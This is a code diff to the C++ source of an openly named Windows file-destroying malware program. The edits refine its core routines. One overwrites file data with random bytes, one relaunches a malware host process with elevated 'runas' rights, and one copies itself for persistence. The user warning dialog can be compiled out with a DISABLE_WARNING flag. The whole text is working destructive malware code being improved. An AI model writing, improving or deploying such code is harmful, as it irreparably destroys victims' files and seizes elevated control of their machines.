@@ -109,17 +109,17 @@ INT APIENTRY wWinMain(
 						}
 					} else if (GetFileSizeEx(hFile, &liFs)) {
 						// TODO: Rewrite this b*llshit
-						if (liFs.QuadPart <= nMAX_BUFFER_SIZE) {
-							PWCHAR pszRdDs = new WCHAR[liFs.QuadPart];
+						if ((liFs.QuadPart <= nMAX_BUFFER_SIZE) && (liFs.HighPart == 0)) {
+							PWCHAR pszRdDs = new WCHAR[liFs.LowPart];
 
-							if (BCryptGenRandom(NULL, (LPBYTE)pszRdDs, liFs.QuadPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
+							if (BCryptGenRandom(NULL, (LPBYTE)pszRdDs, liFs.LowPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
 #ifdef DEBUG_MSG
 								MessageBox(NULL, L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", L"BCryptGenRandom", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
 #endif // DEBUG_MSG
-								ZeroMemory(pszRdDs, liFs.QuadPart);
+								ZeroMemory(pszRdDs, liFs.LowPart);
 							}
 
-							if (!WriteFile(hFile, pszRdDs, liFs.QuadPart, &dwNOBW, NULL)) {
+							if (!WriteFile(hFile, pszRdDs, liFs.LowPart, &dwNOBW, NULL)) {
 #ifdef DEBUG_MSG
 								MessageBox(NULL, L"Couldn't overwrite FileData", L"WriteFile", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
 #endif // DEBUG_MSG
@@ -313,22 +313,22 @@ INT APIENTRY wWinMain(
 			}
 		}
 
-		// TODO: maybe improve this (for loop or something)
-		INT nKillswitch = 0;
-		while (!fnCheckMutexW(szHOST_MUTEX)) {
-			if (nKillswitch == 50) {
+		for (INT i = 0; i < 50; i++) {
+			if (fnCheckMutexW(szHOST_MUTEX)) {
+				ShellExecute(NULL, L"runas", szMfn, L"/exec", NULL, SW_SHOWDEFAULT);
+				break;
+			} else {
+				if (i == (50 - 1)) {
 #ifdef DEBUG_MSG
-				MessageBox(NULL, L"Malware Host failed to launch", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+					MessageBox(NULL, L"Malware Host failed to launch", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif // DEBUG_MSG
-				HeapFree(hHeap, NULL, szArglist);
-				ExitProcess(EXIT_FAILURE);
+					HeapFree(hHeap, NULL, szArglist);
+					ExitProcess(EXIT_FAILURE);
+				}
+
+				Sleep(100);
 			}
-
-			nKillswitch++;
-			Sleep(100);
 		}
-
-		ShellExecute(NULL, L"runas", szMfn, L"/exec", NULL, SW_SHOWDEFAULT);
 	} else {
 #ifndef DISABLE_WARNING
 		// Warn User about the execution of the Malware
@@ -337,7 +337,7 @@ INT APIENTRY wWinMain(
 			L"and your Files being irreparably damaged/destroyed.\n\n"
 			L"If you're seeing this Message without knowing what you just executed, simply press NO and nothing will happen.\n"
 			L"If you know what you're doing press YES to continue.\n\n"
-			L"DO YOU WANT TO EXECUTE THIS MALWARE ?", L"N0T-iLLerka.X", MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) == IDYES) {
+			L"DO YOU WANT TO EXECUTE THIS MALWARE ?", szMALWR_NAME, MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) == IDYES) {
 #endif // !DISABLE_WARNING
 			if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str(), szMfn)) {
 				ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
